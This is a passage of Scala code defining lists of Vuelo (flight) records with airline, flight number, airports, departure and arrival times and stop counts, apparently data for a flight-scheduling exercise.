    Vuelo(""NW"", 417, ""DTW"", 18, 55, ""DCA"", 10, 21, 0),
    Vuelo(""NW"", 751, ""DTW"", 17, 40, ""MSP"", 18, 38, 0),
    Vuelo(""NW"", 397, ""MSY"", 6, 35, ""MSP"", 10, 31, 1),
    Vuelo(""NW"", 720, ""MSP"", 7, 50, ""BOS"", 11, 22, 0),
    Vuelo(""NW"", 746, ""MSP"", 10, 0, ""DTW"", 12, 40, 0),
    Vuelo(""NW"", 462, ""STL"", 9, 35, ""DTW"", 12, 5, 0),
    Vuelo(""NW"", 173, ""DTW"", 18, 45, ""ORD"", 19, 3, 0),
    Vuelo(""NW"", 48, ""DTW"", 16, 55, ""BOS"", 18, 49, 0),
    Vuelo(""NW"", 286, ""DTW"", 17, 0, ""DCA"", 18, 26, 0),
    Vuelo(""NW"", 563, ""DCA"", 9, 10, ""MSP"", 10, 54, 0),
    Vuelo(""NW"", 933, ""MSP"", 9, 30, ""LAX"", 11, 20, 0),
    Vuelo(""NW"", 304, ""LAX"", 8, 10, ""MSP"", 13, 39, 0),
    Vuelo(""NW"", 575, ""BOS"", 6, 25, ""SEA"", 11, 26, 1),
    Vuelo(""NW"", 570, ""MSP"", 7, 55, ""MIA"", 12, 30, 0),
    Vuelo(""NW"", 777, ""PHL"", 9, 0, ""MSP"", 10, 52, 0),
    Vuelo(""NW"", 479, ""TPA"", 8, 55, ""DTW"", 11, 34, 0),
    Vuelo(""NW"", 270, ""HOU"", 9, 10, ""DTW"", 12, 43, 0),
    Vuelo(""NW"", 740, ""MSP"", 6, 0, ""DTW"", 13, 8, 0),
    Vuelo(""NW"", 347, ""DCA"", 16, 20, ""SFO"", 11, 5, 1),
    Vuelo(""NW"", 100, ""PHX"", 8, 15, ""MSP"", 12, 18, 0),
    Vuelo(""NW"", 140, ""MSP"", 17, 0, ""ORD"", 18, 15, 0),
    Vuelo(""NW"", 742, ""MSP"", 7, 0, ""DTW"", 13, 8, 0),
    Vuelo(""NW"", 744, ""MSP"", 8, 20, ""DTW"", 10, 58, 0),
    Vuelo(""NW"", 312, ""MSP"", 7, 0, ""DCA"", 10, 13, 0),
    Vuelo(""NW"", 472, ""ORD"", 16, 0, ""MSP"", 17, 29, 0),
    Vuelo(""NW"", 383, ""BOS"", 7, 25, ""DTW"", 13, 8, 0),
    Vuelo(""NW"", 205, ""DTW"", 15, 10, ""ORD"", 15, 25, 0),
    Vuelo(""NW"", 756, ""MSP"", 18, 5, ""DTW"", 10, 55, 0),
    Vuelo(""NW"", 985, ""ORD"", 19, 0, ""MSP"", 10, 25, 0),
    Vuelo(""NW"", 101, ""MSP"", 9, 30, ""PHX"", 11, 56, 0),
    Vuelo(""NW"", 302, ""LAX"", 7, 0, ""MSP"", 12, 25, 0),
    Vuelo(""NW"", 401, ""MSP"", 7, 50, ""DFW"", 10, 18, 0),
    Vuelo(""NW"", 447, ""TPA"", 8, 35, ""MSP"", 10, 50, 0),
    Vuelo(""NW"", 285, ""DCA"", 6, 50, ""DTW"", 12, 6, 0),
    Vuelo(""NW"", 591, ""MSP"", 7, 35, ""STL"", 10, 5, 0),
    Vuelo(""NW"", 691, ""DTW"", 9, 30, ""DFW"", 11, 37, 0),
    Vuelo(""NW"", 476, ""DTW"", 9, 20, ""TPA"", 12, 0, 0),
    Vuelo(""NW"", 478, ""MSP"", 7, 50, ""TPA"", 11, 58, 0),
    Vuelo(""NW"", 250, ""PHX"", 13, 50, ""DTW"", 19, 33, 0),
    Vuelo(""NW"", 710, ""MSP"", 13, 0, ""PHL"", 16, 20, 0),
    Vuelo(""NW"", 330, ""DTW"", 15, 10, ""BOS"", 17, 3, 0),
    Vuelo(""NW"", 134, ""MSP"", 14, 0, ""ORD"", 15, 15, 0),
    Vuelo(""NW"", 580, ""SEA"", 13, 55, ""DTW"", 11, 1, 0),
    Vuelo(""NW"", 175, ""DTW"", 20, 35, ""ORD"", 10, 54, 0),
    Vuelo(""NW"", 99, ""MSP"", 7, 45, ""PHX"", 10, 6, 0),
    Vuelo(""NW"", 311, ""DCA"", 20, 15, ""MSP"", 11, 50, 0),
    Vuelo(""NW"", 239, ""DCA"", 17, 45, ""DTW"", 19, 28, 0),
    Vuelo(""NW"", 486, ""BOS"", 17, 25, ""DTW"", 19, 42, 0),
    Vuelo(""NW"", 165, ""ORD"", 10, 0, ""MSP"", 11, 27, 0),
    Vuelo(""NW"", 563, ""DCA"", 9, 10, ""DEN"", 12, 45, 1),
    Vuelo(""NW"", 34, ""JFK"", 18, 0, ""BOS"", 19, 19, 0),
    Vuelo(""NW"", 486, ""BOS"", 17, 25, ""TPA"", 13, 28, 1),
    Vuelo(""NW"", 566, ""MSP"", 20, 35, ""ORD"", 11, 47, 0),
    Vuelo(""NW"", 380, ""DTW"", 7, 30, ""BOS"", 11, 8, 0),
    Vuelo(""NW"", 932, ""LAX"", 2, 15, ""BOS"", 12, 15, 1),
    Vuelo(""NW"", 352, ""MSP"", 14, 40, ""BOS"", 18, 12, 0),
    Vuelo(""NW"", 390, ""DTW"", 18, 55, ""BOS"", 10, 50, 0),
    Vuelo(""NW"", 311, ""DCA"", 20, 15, ""LAX"", 12, 28, 1),
    Vuelo(""NW"", 745, ""BOS"", 9, 10, ""DTW"", 11, 27, 0),
    Vuelo(""PA"", 425, ""ATL"", 8, 35, ""MIA"", 10, 19, 0),
    Vuelo(""PA"", 499, ""TPA"", 16, 30, ""MIA"", 17, 28, 0),
    Vuelo(""PA"", 986, ""MIA"", 17, 55, ""TPA"", 19, 0, 0),
    Vuelo(""PA"", 402, ""MIA"", 17, 45, ""JFK"", 10, 44, 0),
    Vuelo(""PA"", 701, ""ORD"", 17, 10, ""MIA"", 11, 3, 0),
    Vuelo(""PA"", 448, ""MIA"", 17, 45, ""SFO"", 12, 48, 1),
    Vuelo(""PA"", 448, ""MIA"", 17, 45, ""LAX"", 10, 46, 0),
    Vuelo(""PA"", 445, ""SFO"", 7, 0, ""MIA"", 17, 19, 1),
    Vuelo(""PA"", 710, ""MIA"", 8, 30, ""DTW"", 11, 50, 0),
    Vuelo(""PA"", 442, ""LAX"", 17, 15, ""SFO"", 18, 40, 0),
    Vuelo(""PA"", 438, ""MIA"", 17, 45, ""DTW"", 11, 5, 0),
    Vuelo(""PA"", 978, ""MIA"", 17, 40, ""DCA"", 10, 15, 0),
    Vuelo(""PA"", 436, ""MIA"", 17, 35, ""BOS"", 10, 56, 0)
  )

 val vuelosD2= List(
    Vuelo(""PA"", 427, ""JFK"", 14, 45, ""MIA"", 17, 57, 0),
    Vuelo(""PA"", 482, ""LAX"", 18, 0, ""SFO"", 19, 17, 0),
    Vuelo(""PA"", 429, ""BOS"", 14, 20, ""MIA"", 17, 44, 0),
    Vuelo(""PA"", 445, ""SFO"", 7, 0, ""LAX"", 12, 6, 0),
    Vuelo(""PA"", 403, ""JFK"", 7, 15, ""MIA"", 10, 20, 0),
    Vuelo(""PA"", 447, ""SFO"", 20, 30, ""MIA"", 13, 1, 1),
    Vuelo(""PA"", 483, ""ORD"", 14, 10, ""MIA"", 18, 3, 0),
    Vuelo(""PA"", 700, ""MIA"", 9, 0, ""ORD"", 11, 3, 0),
    Vuelo(""PA"", 445, ""LAX"", 9, 15, ""MIA"", 17, 19, 0),
    Vuelo(""PA"", 433, ""MSY"", 15, 20, ""MIA"", 18, 5, 0),
    Vuelo(""PA"", 442, ""MIA"", 13, 30, ""LAX"", 16, 31, 0),
    Vuelo(""PA"", 484, ""MIA"", 13, 40, ""ORD"", 15, 43, 0),
    Vuelo(""PA"", 495, ""DCA"", 10, 45, ""MIA"", 13, 20, 0),
    Vuelo(""PA"", 985, ""TPA"", 9, 15, ""MIA"", 10, 13, 0),
    Vuelo(""PA"", 430, ""MIA"", 13, 25, ""BOS"", 16, 39, 0),
    Vuelo(""PA"", 423, ""DCA"", 15, 30, ""MIA"", 18, 5, 0),
    Vuelo(""PA"", 421, ""DTW"", 14, 35, ""MIA"", 17, 36, 0),
    Vuelo(""PA"", 464, ""MIA"", 13, 45, ""TPA"", 14, 50, 0),
    Vuelo(""PA"", 434, ""MIA"", 13, 20, ""MSY"", 14, 32, 0),
    Vuelo(""PA"", 492, ""MIA"", 12, 15, ""DCA"", 14, 44, 0),
    Vuelo(""PA"", 440, ""MIA"", 8, 0, ""LAX"", 10, 40, 0),
    Vuelo(""PA"", 424, ""MIA"", 13, 35, ""DCA"", 16, 4, 0),
    Vuelo(""PA"", 300, ""MIA"", 7, 25, ""TPA"", 13, 0, 0),
    Vuelo(""PA"", 441, ""LAX"", 12, 30, ""MIA"", 10, 6, 0),
    Vuelo(""PA"", 447, ""SFO"", 20, 30, ""LAX"", 11, 56, 0),
    Vuelo(""PA"", 418, ""MIA"", 17, 50, ""MSY"", 19, 2, 0),
    Vuelo(""PA"", 448, ""LAX"", 21, 30, ""SFO"", 12, 48, 0),
    Vuelo(""PA"", 481, ""SFO"", 8, 0, ""LAX"", 12, 4, 0),
    Vuelo(""PA"", 737, ""DFW"", 17, 15, ""MIA"", 11, 1, 0),
    Vuelo(""PA"", 437, ""DTW"", 7, 15, ""MIA"", 10, 16, 0),
    Vuelo(""PA"", 417, ""MSY"", 7, 30, ""MIA"", 10, 15, 0),
    Vuelo(""PA"", 428, ""MIA"", 13, 20, ""JFK"", 16, 35, 0),
    Vuelo(""PA"", 977, ""DCA"", 7, 45, ""MIA"", 10, 20, 0),
    Vuelo(""PA"", 447, ""LAX"", 22, 45, ""MIA"", 13, 1, 0),
    Vuelo(""PA"", 442, ""MIA"", 13, 30, ""SFO"", 18, 40, 1),
    Vuelo(""PA"", 435, ""BOS"", 7, 0, ""MIA"", 10, 25, 0),
    Vuelo(""PA"", 319, ""TPA"", 20, 0, ""MIA"", 10, 58, 0),
    Vuelo(""PA"", 426, ""MIA"", 17, 55, ""ATL"", 19, 58, 0),
    Vuelo(""PA"", 422, ""MIA"", 14, 5, ""DFW"", 16, 27, 0),
    Vuelo(""QF"", 305, ""LAX"", 12, 45, ""ORD"", 18, 42, 0),
    Vuelo(""QF"", 306, ""ORD"", 18, 30, ""LAX"", 10, 35, 0),
    Vuelo(""QF"", 302, ""JFK"", 18, 0, ""LAX"", 10, 55, 0),
    Vuelo(""QF"", 307, ""LAX"", 14, 0, ""BOS"", 12, 16, 0),
    Vuelo(""QF"", 301, ""LAX"", 13, 0, ""JFK"", 11, 0, 0),
    Vuelo(""QF"", 308, ""BOS"", 17, 15, ""LAX"", 10, 32, 0),
    Vuelo(""TW"", 89, ""STL"", 21, 24, ""ABQ"", 13, 11, 0),
    Vuelo(""TW"", 78, ""BNA"", 15, 41, ""STL"", 16, 51, 0),
    Vuelo(""TW"", 121, ""ORD"", 19, 15, ""STL"", 10, 29, 0),
    Vuelo(""TW"", 599, ""ATL"", 16, 39, ""STL"", 17, 27, 0),
    Vuelo(""TW"", 529, ""BNA"", 10, 9, ""STL"", 11, 22, 0),
    Vuelo(""TW"", 59, ""STL"", 11, 57, ""PHX"", 14, 20, 0),
    Vuelo(""TW"", 320, ""STL"", 20, 45, ""DTW"", 13, 14, 0),
    Vuelo(""TW"", 180, ""SFO"", 13, 20, ""STL"", 19, 5, 0),
    Vuelo(""TW"", 3, ""JFK"", 19, 59, ""LAX"", 13, 12, 0),
    Vuelo(""TW"", 700, ""DCA"", 16, 59, ""JFK"", 18, 17, 0),
    Vuelo(""TW"", 150, ""SEA"", 10, 4, ""STL"", 15, 57, 0),
    Vuelo(""TW"", 608, ""STL"", 20, 17, ""RDU"", 13, 14, 0),
    Vuelo(""TW"", 177, ""STL"", 12, 10, ""SFO"", 14, 25, 0),
    Vuelo(""TW"", 766, ""DTW"", 15, 0, ""JFK"", 16, 49, 0),
    Vuelo(""TW"", 290, ""ABQ"", 12, 44, ""STL"", 16, 3, 0),
    Vuelo(""TW"", 324, ""SFO"", 1, 10, ""STL"", 15, 2, 0),
    Vuelo(""TW"", 184, ""LAX"", 13, 20, ""STL"", 18, 53, 0),
    Vuelo(""TW"", 284, ""PHX"", 8, 31, ""STL"", 12, 25, 0),
    Vuelo(""TW"", 621, ""ATL"", 13, 39, ""STL"", 14, 24, 0),
    Vuelo(""TW"", 305, ""JFK"", 17, 50, ""TPA"", 10, 52, 0),
    Vuelo(""TW"", 659, ""ATL"", 10, 39, ""STL"", 11, 27, 0),
    Vuelo(""TW"", 664, ""DFW"", 17, 37, ""STL"", 19, 22, 0),
    Vuelo(""TW"", 525, ""STL"", 9, 22, ""DFW"", 11, 23, 0),
    Vuelo(""TW"", 336, ""STL"", 20, 8, ""TPA"", 13, 28, 0),
    Vuelo(""TW"", 304, ""TPA"", 14, 6, ""JFK"", 16, 50, 0),
    Vuelo(""TW"", 639, ""MSP"", 15, 49, ""HOU"", 10, 46, 1),
    Vuelo(""TW"", 60, ""STL"", 13, 46, ""JFK"", 17, 20, 0),
    Vuelo(""TW"", 696, ""STL"", 8, 21, ""BNA"", 12, 9, 0),
    Vuelo(""TW"", 234, ""TPA"", 12, 54, ""STL"", 14, 21, 0),
    Vuelo(""TW"", 326, ""STL"", 13, 32, ""ORD"", 14, 48, 0),
    Vuelo(""TW"", 220, ""STL"", 16, 50, ""DTW"", 19, 31, 0),
    Vuelo(""TW"", 321, ""RDU"", 7, 1, ""STL"", 11, 4, 0),
    Vuelo(""TW"", 845, ""JFK"", 15, 35, ""STL"", 17, 27, 0),
    Vuelo(""TW"", 693, ""STL"", 15, 17, ""MSP"", 16, 57, 0),
    Vuelo(""TW"", 817, ""JFK"", 17, 59, ""DTW"", 10, 9, 0),
    Vuelo(""TW"", 756, ""LAX"", 7, 0, ""STL"", 12, 33, 0),
    Vuelo(""TW"", 23, ""STL"", 21, 18, ""SEA"", 13, 50, 0),
    Vuelo(""TW"", 75, ""STL"", 15, 12, ""PHX"", 17, 37, 0),
    Vuelo(""TW"", 446, ""STL"", 20, 6, ""PHL"", 13, 14, 0),
    Vuelo(""TW"", 358, ""STL"", 11, 49, ""DCA"", 14, 41, 0),
    Vuelo(""TW"", 4, ""MIA"", 13, 30, ""JFK"", 16, 37, 0),
    Vuelo(""TW"", 223, ""STL"", 9, 7, ""SFO"", 11, 39, 0),
    Vuelo(""TW"", 712, ""PHL"", 14, 36, ""BOS"", 17, 17, 1),
    Vuelo(""TW"", 184, ""LAX"", 13, 20, ""BOS"", 13, 25, 1),
    Vuelo(""TW"", 91, ""DTW"", 13, 45, ""STL"", 14, 28, 0),
    Vuelo(""TW"", 738, ""PHL"", 17, 40, ""JFK"", 18, 39, 0),
    Vuelo(""TW"", 605, ""STL"", 9, 12, ""HOU"", 11, 24, 0),
    Vuelo(""TW"", 150, ""SEA"", 10, 4, ""BOS"", 10, 46, 1),
    Vuelo(""TW"", 71, ""STL"", 18, 30, ""SFO"", 10, 46, 0),
    Vuelo(""TW"", 492, ""SFO"", 10, 10, ""MIA"", 10, 38, 1),
    Vuelo(""TW"", 492, ""LAX"", 7, 45, ""STL"", 15, 49, 1),
    Vuelo(""TW"", 572, ""STL"", 20, 12, ""ATL"", 12, 54, 0),
    Vuelo(""TW"", 391, ""BOS"", 9, 20, ""STL"", 14, 37, 2),
    Vuelo(""TW"", 633, ""MIA"", 9, 18, ""STL"", 11, 12, 0),
    Vuelo(""TW"", 473, ""STL"", 21, 17, ""MSP"", 12, 49, 0),
    Vuelo(""TW"", 711, ""JFK"", 17, 50, ""PHL"", 18, 54, 0),
    Vuelo(""TW"", 185, ""DCA"", 7, 0, ""STL"", 13, 1, 0),
    Vuelo(""TW"", 255, ""BOS"", 18, 2, ""STL"", 10, 18, 0),
    Vuelo(""TW"", 378, ""STL"", 8, 3, ""ORD"", 11, 5, 0),
    Vuelo(""TW"", 77, ""JFK"", 17, 59, ""STL"", 19, 59, 0),
    Vuelo(""TW"", 711, ""JFK"", 17, 50, ""STL"", 10, 45, 1),
    Vuelo(""TW"", 591, ""STL"", 9, 2, ""MSP"", 10, 37, 0),
    Vuelo(""TW"", 8, ""LAX"", 16, 0, ""JFK"", 13, 55, 0),
    Vuelo(""TW"", 743, ""BOS"", 15, 35, ""JFK"", 16, 48, 0),
    Vuelo(""TW"", 816, ""ATL"", 14, 34, ""JFK"", 16, 50, 0),
    Vuelo(""TW"", 53, ""BOS"", 12, 3, ""STL"", 14, 23, 0),
    Vuelo(""TW"", 743, ""JFK"", 17, 50, ""DEN"", 10, 39, 0),
    Vuelo(""TW"", 754, ""SFO"", 8, 25, ""BOS"", 16, 50, 0),
    Vuelo(""TW"", 336, ""TPA"", 23, 59, ""MIA"", 12, 47, 0),
    Vuelo(""TW"", 522, ""DFW"", 8, 1, ""STL"", 14, 5, 0),
    Vuelo(""TW"", 412, ""STL"", 8, 48, ""MIA"", 12, 31, 0),
    Vuelo(""TW"", 223, ""BOS"", 6, 0, ""LAX"", 13, 30, 2),
    Vuelo(""TW"", 45, ""JFK"", 8, 50, ""SFO"", 12, 8, 0),
    Vuelo(""TW"", 731, ""JFK"", 18, 15, ""PHX"", 11, 47, 0),
    Vuelo(""TW"", 183, ""STL"", 15, 25, ""SFO"", 17, 36, 0),
    Vuelo(""TW"", 245, ""MIA"", 7, 20, ""TPA"", 11, 7, 1),
    Vuelo(""TW"", 805, ""JFK"", 18, 15, ""HOU"", 11, 29, 0),
    Vuelo(""TW"", 686, ""STL"", 20, 2, ""BNA"", 11, 18, 0),
    Vuelo(""TW"", 849, ""JFK"", 18, 0, ""LAX"", 11, 11, 0),
    Vuelo(""TW"", 831, ""JFK"", 19, 30, ""ATL"", 12, 12, 0),
    Vuelo(""TW"", 805, ""HOU"", 21, 55, ""DFW"", 12, 55, 0),
    Vuelo(""TW"", 700, ""STL"", 13, 25, ""DCA"", 16, 28, 0),
    Vuelo(""TW"", 331, ""STL"", 18, 39, ""MSP"", 10, 15, 0),
    Vuelo(""TW"", 30, ""LAX"", 14, 20, ""STL"", 10, 2, 0),
    Vuelo(""TW"", 512, ""HOU"", 17, 28, ""STL"", 19, 27, 0),
    Vuelo(""TW"", 10, ""STL"", 17, 5, ""DCA"", 10, 0, 0),
    Vuelo(""TW"", 326, ""SEA"", 6, 44, ""STL"", 12, 39, 0),
    Vuelo(""TW"", 805, ""JFK"", 18, 15, ""DFW"", 12, 55, 1),
    Vuelo(""TW"", 223, ""STL"", 9, 7, ""LAX"", 13, 30, 1),
    Vuelo(""TW"", 829, ""JFK"", 18, 15, ""ORD"", 10, 10, 0),
    Vuelo(""TW"", 401, ""JFK"", 18, 25, ""MSP"", 12, 4, 1),
    Vuelo(""TW"", 717, ""BNA"", 19, 32, ""STL"", 10, 40, 0),
    Vuelo(""TW"", 130, ""DFW"", 11, 0, ""HOU"", 12, 0, 0),
    Vuelo(""TW"", 337, ""DTW"", 10, 42, ""STL"", 11, 27, 0),
    Vuelo(""TW"", 223, ""BOS"", 6, 0, ""STL"", 12, 2, 0),
    Vuelo(""TW"", 492, ""SFO"", 10, 10, ""STL"", 15, 49, 0),
    Vuelo(""TW"", 130, ""DFW"", 11, 0, ""JFK"", 16, 50, 1),
    Vuelo(""TW"", 711, ""PHL"", 19, 19, ""STL"", 10, 45, 0),
    Vuelo(""TW"", 594, ""STL"", 10, 30, ""BNA"", 11, 36, 0),
    Vuelo(""TW"", 31, ""BOS"", 9, 4, ""LAX"", 14, 17, 1),
    Vuelo(""TW"", 29, ""STL"", 9, 17, ""SEA"", 12, 0, 0),
    Vuelo(""TW"", 639, ""MSP"", 15, 49, ""STL"", 17, 24, 0),
    Vuelo(""TW"", 405, ""STL"", 21, 25, ""HOU"", 13, 34, 0),
    Vuelo(""TW"", 204, ""STL"", 16, 49, ""TPA"", 10, 10, 0),
    Vuelo(""TW"", 870, ""DEN"", 9, 48, ""JFK"", 15, 25, 0),
    Vuelo(""TW"", 507, ""STL"", 12, 0, ""MSP"", 13, 36, 0),
    Vuelo(""TW"", 99, ""DCA"", 12, 10, ""STL"", 13, 37, 0),
    Vuelo(""TW"", 703, ""JFK"", 16, 30, ""DCA"", 17, 54, 0),
    Vuelo(""TW"", 344, ""HOU"", 7, 54, ""STL"", 14, 8, 0),
    Vuelo(""TW"", 344, ""HOU"", 7, 54, ""PHL"", 13, 51, 1),
    Vuelo(""TW"", 457, ""TPA"", 7, 0, ""STL"", 13, 1, 0),
    Vuelo(""TW"", 100, ""SEA"", 13, 15, ""STL"", 19, 15, 0),
    Vuelo(""TW"", 447, ""DCA"", 8, 12, ""STL"", 14, 5, 0),
    Vuelo(""TW"", 10, ""DCA"", 20, 33, ""JFK"", 11, 38, 0),
    Vuelo(""TW"", 432, ""STL"", 7, 39, ""DTW"", 10, 5, 0),
    Vuelo(""TW"", 155, ""ORD"", 9, 55, ""STL"", 11, 12, 0),
    Vuelo(""TW"", 345, ""DTW"", 20, 7, ""STL"", 10, 45, 0),
    Vuelo(""TW"", 720, ""LAX"", 10, 0, ""STL"", 15, 27, 0),
    Vuelo(""TW"", 278, ""DFW"", 10, 25, ""STL"", 12, 7, 0),
    Vuelo(""TW"", 316, ""PHX"", 12, 18, ""STL"", 16, 15, 0),
    Vuelo(""TW"", 203, ""JFK"", 6, 27, ""STL"", 11, 7, 0),
    Vuelo(""TW"", 224, ""STL"", 13, 30, ""DTW"", 16, 8, 0),
    Vuelo(""TW"", 730, ""PHX"", 9, 30, ""JFK"", 16, 5, 0),
    Vuelo(""TW"", 391, ""JFK"", 11, 14, ""DCA"", 12, 30, 0),
    Vuelo(""TW"", 670, ""STL"", 11, 34, ""ORD"", 12, 45, 0),
    Vuelo(""TW"", 609, ""ATL"", 19, 56, ""STL"", 10, 40, 0),
    Vuelo(""TW"", 552, ""MSP"", 11, 7, ""STL"", 12, 45, 0),
    Vuelo(""TW"", 525, ""MSP"", 6, 53, ""STL"", 13, 2, 0),
    Vuelo(""TW"", 281, ""PHL"", 12, 48, ""STL"", 14, 20, 0),
    Vuelo(""TW"", 496, ""MSP"", 8, 5, ""MIA"", 14, 9, 1),
    Vuelo(""TW"", 844, ""STL"", 13, 18, ""JFK"", 16, 50, 0),
    Vuelo(""TW"", 574, ""MSY"", 14, 27, ""ORD"", 18, 26, 1),
    Vuelo(""TW"", 217, ""PHL"", 7, 0, ""STL"", 13, 2, 0),
    Vuelo(""TW"", 746, ""ORD"", 12, 30, ""JFK"", 15, 39, 0),
    Vuelo(""TW"", 55, ""DCA"", 15, 59, ""STL"", 17, 27, 0),
    Vuelo(""TW"", 703, ""STL"", 21, 30, ""DEN"", 12, 55, 0),
    Vuelo(""TW"", 360, ""STL"", 13, 15, ""ATL"", 15, 57, 0),
    Vuelo(""TW"", 72, ""LAX"", 12, 50, ""STL"", 11, 0, 0),
    Vuelo(""TW"", 654, ""ORD"", 8, 27, ""STL"", 14, 3, 0),
    Vuelo(""TW"", 519, ""ORD"", 13, 17, ""STL"", 14, 34, 0),
    Vuelo(""TW"", 15, ""JFK"", 8, 55, ""LAX"", 11, 49, 0),
    Vuelo(""TW"", 199, ""DCA"", 16, 22, ""STL"", 17, 50, 0),
    Vuelo(""TW"", 756, ""STL"", 13, 25, ""PHL"", 16, 33, 0),
    Vuelo(""TW"", 471, ""MIA"", 14, 55, ""STL"", 16, 47, 0),
    Vuelo(""TW"", 88, ""STL"", 19, 38, ""ORD"", 10, 56, 0),
    Vuelo(""TW"", 525, ""MSP"", 6, 53, ""DFW"", 11, 23, 1),
    Vuelo(""TW"", 338, ""MSY"", 10, 48, ""STL"", 12, 40, 0),
    Vuelo(""TW"", 419, ""PHL"", 9, 37, ""STL"", 11, 7, 0),
    Vuelo(""TW"", 146, ""PHX"", 2, 55, ""STL"", 14, 6, 0),
    Vuelo(""TW"", 15, ""BOS"", 6, 17, ""JFK"", 12, 5, 0),
    Vuelo(""TW"", 469, ""MIA"", 12, 20, ""STL"", 14, 12, 0),
    Vuelo(""TW"", 262, ""STL"", 12, 33, ""DCA"", 15, 32, 0),
    Vuelo(""TW"", 97, ""PHL"", 15, 59, ""STL"", 17, 29, 0),
    Vuelo(""TW"", 712, ""JFK"", 16, 5, ""BOS"", 17, 17, 0),
    Vuelo(""TW"", 440, ""STL"", 13, 37, ""DCA"", 16, 42, 0),
    Vuelo(""TW"", 570, ""MSP"", 17, 36, ""STL"", 19, 22, 0),
    Vuelo(""TW"", 44, ""JFK"", 6, 50, ""BOS"", 15, 4, 0),
    Vuelo(""TW"", 44, ""SFO"", 22, 0, ""JFK"", 10, 0, 0),
    Vuelo(""TW"", 744, ""DCA"", 14, 21, ""JFK"", 15, 31, 0),
    Vuelo(""TW"", 621, ""STL"", 15, 9, ""DFW"", 17, 1, 0),
    Vuelo(""TW"", 646, ""STL"", 7, 39, ""ATL"", 10, 12, 0),
    Vuelo(""TW"", 44, ""SFO"", 22, 0, ""BOS"", 15, 4, 1),
    Vuelo(""TW"", 679, ""ORD"", 7, 4, ""STL"", 12, 0, 0),
    Vuelo(""TW"", 245, ""TPA"", 9, 45, ""STL"", 11, 18, 0),
    Vuelo(""TW"", 222, ""STL"", 8, 39, ""TPA"", 11, 59, 0),
    Vuelo(""TW"", 80, ""STL"", 7, 49, ""DCA"", 10, 40, 0),
    Vuelo(""TW"", 177, ""STL"", 12, 10, ""LAX"", 16, 23, 1),
    Vuelo(""TW"", 436, ""STL"", 10, 36, ""BOS"", 14, 10, 0),
    Vuelo(""TW"", 708, ""SEA"", 8, 50, ""JFK"", 16, 50, 0),
    Vuelo(""TW"", 531, ""STL"", 7, 43, ""DFW"", 13, 9, 0),
    Vuelo(""TW"", 377, ""TPA"", 16, 26, ""STL"", 17, 54, 0),
    Vuelo(""TW"", 309, ""STL"", 12, 9, ""HOU"", 14, 31, 0),
    Vuelo(""TW"", 702, ""LAX"", 22, 0, ""JFK"", 10, 0, 0),
    Vuelo(""TW"", 240, ""STL"", 20, 12, ""DCA"", 13, 8, 0),
    Vuelo(""TW"", 123, ""DCA"", 9, 43, ""ABQ"", 13, 40, 1),
    Vuelo(""TW"", 80, ""SEA"", 1, 12, ""STL"", 15, 7, 0),
    Vuelo(""TW"", 717, ""JFK"", 16, 20, ""BNA"", 19, 7, 1),
    Vuelo(""TW"", 577, ""RDU"", 13, 17, ""STL"", 14, 36, 0),
    Vuelo(""TW"", 814, ""LAX"", 9, 30, ""JFK"", 17, 42, 0),
    Vuelo(""TW"", 223, ""SFO"", 12, 14, ""LAX"", 13, 30, 0),
    Vuelo(""TW"", 71, ""BOS"", 15, 20, ""SFO"", 10, 46, 1),
    Vuelo(""TW"", 391, ""DCA"", 13, 7, ""STL"", 14, 37, 0),
    Vuelo(""TW"", 840, ""LAX"", 8, 0, ""JFK"", 16, 14, 0),
    Vuelo(""TW"", 403, ""STL"", 15, 27, ""LAX"", 17, 27, 0),
    Vuelo(""TW"", 97, ""JFK"", 14, 14, ""STL"", 17, 29, 1),
    Vuelo(""TW"", 344, ""STL"", 10, 42, ""PHL"", 13, 51, 0),
    Vuelo(""TW"", 123, ""STL"", 11, 57, ""ABQ"", 13, 40, 0),
    Vuelo(""TW"", 226, ""STL"", 11, 0, ""TPA"", 14, 21, 0),
    Vuelo(""TW"", 542, ""STL"", 20, 3, ""ORD"", 11, 21, 0),
    Vuelo(""TW"", 88, ""ABQ"", 15, 28, ""ORD"", 10, 56, 1),
    Vuelo(""TW"", 552, ""MSP"", 11, 7, ""BNA"", 14, 50, 1),
    Vuelo(""TW"", 204, ""TPA"", 20, 45, ""MIA"", 12, 34, 1),
    Vuelo(""TW"", 456, ""STL"", 13, 25, ""TPA"", 16, 51, 0),
    Vuelo(""TW"", 717, ""JFK"", 16, 20, ""STL"", 10, 40, 2),
    Vuelo(""TW"", 810, ""STL"", 13, 36, ""BOS"", 17, 10, 0),
    Vuelo(""TW"", 391, ""JFK"", 11, 14, ""STL"", 14, 37, 1),
    Vuelo(""TW"", 31, ""STL"", 12, 20, ""LAX"", 14, 17, 0),
    Vuelo(""TW"", 297, ""STL"", 9, 17, ""ABQ"", 11, 2, 0),
    Vuelo(""TW"", 457, ""STL"", 9, 17, ""DEN"", 10, 50, 0),
    Vuelo(""TW"", 496, ""MSP"", 8, 5, ""STL"", 14, 0, 0),
    Vuelo(""TW"", 184, ""STL"", 20, 0, ""BOS"", 13, 25, 0),
    Vuelo(""TW"", 633, ""STL"", 11, 57, ""MSY"", 13, 49, 0),
    Vuelo(""TW"", 792, ""BNA"", 12, 21, ""JFK"", 16, 50, 1),
    Vuelo(""TW"", 598, ""STL"", 13, 15, ""RDU"", 16, 6, 0),
    Vuelo(""TW"", 881, ""JFK"", 17, 50, ""MSY"", 10, 22, 0),
    Vuelo(""TW"", 410, ""ABQ"", 6, 28, ""DCA"", 13, 32, 1),
    Vuelo(""TW"", 177, ""SFO"", 15, 10, ""LAX"", 16, 23, 0),
    Vuelo(""TW"", 161, ""STL"", 21, 26, ""PHX"", 13, 48, 0),
    Vuelo(""TW"", 67, ""STL"", 21, 24, ""SFO"", 13, 54, 0),
    Vuelo(""TW"", 399, ""STL"", 11, 58, ""DEN"", 13, 28, 0),
    Vuelo(""TW"", 391, ""BOS"", 9, 20, ""JFK"", 10, 35, 0),
    Vuelo(""TW"", 700, ""STL"", 13, 25, ""JFK"", 18, 17, 1),
    Vuelo(""TW"", 880, ""MSY"", 12, 14, ""JFK"", 16, 4, 0),
    Vuelo(""TW"", 845, ""JFK"", 15, 35, ""ABQ"", 10, 25, 1),
    Vuelo(""TW"", 240, ""DEN"", 16, 19, ""DCA"", 13, 8, 1),
    Vuelo(""TW"", 579, ""STL"", 13, 16, ""DFW"", 15, 13, 0),
    Vuelo(""TW"", 695, ""DFW"", 12, 35, ""STL"", 14, 15, 0),
    Vuelo(""TW"", 130, ""HOU"", 12, 30, ""JFK"", 16, 50, 0),
    Vuelo(""TW"", 234, ""TPA"", 12, 54, ""ORD"", 16, 35, 1),
